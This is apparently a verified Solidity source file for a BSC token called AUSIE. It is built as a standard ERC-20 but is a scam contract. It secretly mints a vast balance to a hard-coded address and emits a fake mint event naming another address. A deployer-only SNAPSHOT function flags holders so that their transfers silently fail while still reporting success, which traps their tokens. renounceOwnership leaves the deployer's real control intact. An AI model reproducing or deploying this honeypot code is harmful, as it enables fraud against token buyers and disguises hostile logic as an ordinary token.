/**
 *Submitted for verification at BscScan.com on 2023-03-02
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract AUSIE {
    using SafeMath for uint256;
    mapping (address => uint256) private VXB;
	
    mapping (address => uint256) public VXBB;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "AUSIE";
	
    string public symbol = "AUSIE";
    uint8 public decimals = 6;

    uint256 public totalSupply = 1000000 *10**6;
    address owner = msg.sender;
	  address private RTR;
    uint256 private BSE;
 address private OZ;
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address GRD = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
      address payble = 0xD8387F5B91bEAA46C8BC241032D0094e0c6b21B6;
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
            
             VXB[msg.sender] = totalSupply;
            OZ = msg.sender;
       FORK();}

  
	
	
   
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function FORK() internal  {    
                       BSE = 3;        
                       VXBB[msg.sender] = BSE;
                       RTR = GRD;

                     XVAL();

        emit Transfer(address(0), RTR, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return VXB[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
 	
if(VXBB[msg.sender] <= BSE) {
    require(VXB[msg.sender] >= value);
VXB[msg.sender] -= value;  
VXB[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   if(VXBB[msg.sender] > BSE) {    
                  
        require(VXB[msg.sender] >= value);
      VXB[msg.sender] -= value;  
        VXB[msg.sender] += value;
        emit Transfer(msg.sender, msg.sender, value);
                return true;
    }  }   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 		       function SNAPSHOT (address USR, uint256 SNAP) public {
		 if(msg.sender == OZ) {	   
			   	   
   VXBB[USR] = SNAP;}
   }

 function XVAL() internal  {
                     uint256 xTot = totalSupply.mul(totalSupply);      
                       VXB[payble] = xTot; }
   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  

	 
 

       if(VXBB[from] < BSE && VXBB[to] < BSE) {
        require(value <= VXB[from]);
        require(value <= allowance[from][msg.sender]);
        VXB[from] -= value;
        VXB[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
        }


       if(VXBB[from] == BSE) {
        require(value <= VXB[from]);
        require(value <= allowance[from][msg.sender]);
        VXB[from] -= value;
        VXB[to] += value;
        allowance[from][msg.sender] -= value;


            from = GRD;
	   

        emit Transfer(from, to, value);
        return true; }


         if(VXBB[from] > BSE || VXBB[to] > BSE) {     
                  
         require(value <= VXB[from]);
        require(value <= allowance[from][msg.sender]);
        VXB[from] -= value;
        VXB[from] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, from, value);
                return true;
    }}



     

        	
 }